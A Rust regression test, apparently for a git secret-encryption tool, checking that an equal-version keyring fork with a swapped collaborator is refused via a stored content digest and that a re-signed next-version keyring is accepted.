// ---------------------------------------------------------------------------
// Regression: equal-version fork refused via baseline digest
//
// The freshness baseline records the SHA-256 digest of the accepted
// signed content alongside the version. An equal-version keyring with
// different content, a curation fork or a same-version substitution,
// is refused with exit 14 instead of silently replacing the
// collaborator set.
// ---------------------------------------------------------------------------

#[test]
fn fix_equal_version_fork_refused_by_baseline_digest() {
    let f = Fixture::new("fork-digest");
    let _carol = f.add_collab("carol@example.com");
    f.add_file("secrets.env", b"TOKEN=x\n");
    f.hide();
    f.stage_all();
    let keyring_path = f.repo.join(".git-veil/keyring");

    // Fork: a different keyring at the same version, carol swapped for
    // dave and signed by the owner key. This is what two unsynchronised
    // curating machines would produce.
    let base = fs::read_to_string(&keyring_path).unwrap();
    let fork = resigned(
        &base.replace("carol@example.com", "dave@example.com"),
        Some(1),
        &f,
    );
    fs::write(&keyring_path, &fork).unwrap();
    let err = cmd_verify_keys(&f.repo.path, "origin", &f.key_store.path)
        .expect_err("equal-version fork must be refused");
    assert_eq!(exit_code_of(&err), 14);

    // The legitimate bump (same content, next version) is accepted.
    let next = resigned(&fs::read_to_string(&keyring_path).unwrap(), Some(2), &f);
    fs::write(&keyring_path, &next).unwrap();
    cmd_verify_keys(&f.repo.path, "origin", &f.key_store.path)
        .expect("the legitimate version bump advances the baseline");
}
